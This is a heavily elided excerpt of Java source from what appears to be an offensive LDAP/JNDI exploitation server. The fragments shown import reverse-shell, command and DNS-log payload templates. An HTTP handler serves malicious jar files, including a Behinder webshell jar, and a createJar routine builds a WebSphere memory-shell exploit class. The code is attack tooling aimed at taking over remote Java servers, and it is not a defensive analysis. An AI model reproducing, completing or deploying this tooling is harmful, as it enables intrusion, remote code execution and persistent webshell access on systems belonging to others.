...
import com.mickhu.ldap.template.CommandTemplate;
import com.mickhu.ldap.template.DnslogTemplate;
import com.mickhu.ldap.template.ReverseShellTemplate;
import com.mickhu.ldap.utils.Cache;
import com.mickhu.ldap.utils.Config;
import com.mickhu.ldap.utils.Util;
        ...
        httpServer.createContext("/", new HttpHandler() {
            ...
            public void handle(HttpExchange httpExchange){
                try {
                    ...
                    System.out.println("httpExchange.getRequestURI().getPath():"+path);
...
//                exchange.getResponseHeaders().set("Content-type","application/octet-stream");
    ...
    private static void handleJarRequest(HttpExchange exchange) throws IOException{
        ...
        String jarName = path.substring(path.lastIndexOf("/") + 1, path.lastIndexOf("."));
                ...
                /*
                    修复jar包下载失败问题和jar包访问路径失效问题
                    原因：exchange.write()字节流异常问题
                    方法：使用OutputStream类去传输字节流
                */
//                byte[] bytes =  null;
...
//                exchange.sendResponseHeaders(200, bytes.length + 1);
//                exchange.getResponseBody().write(bytes);
        String filename =  cwd + File.separator +"data" + File.separator;
        if (jarName.equalsIgnoreCase("!behinder3")){

            filename += "behinder3.jar";
    ...
    */
    private static String createJar(String type, String... params) throws Exception {
        ...
        if (type.toLowerCase().equals("command")) {
            ...
            CtClass exploitClass = classPool.get("com.mickhu.ldap.template.WebsphereMemshellTemplate");
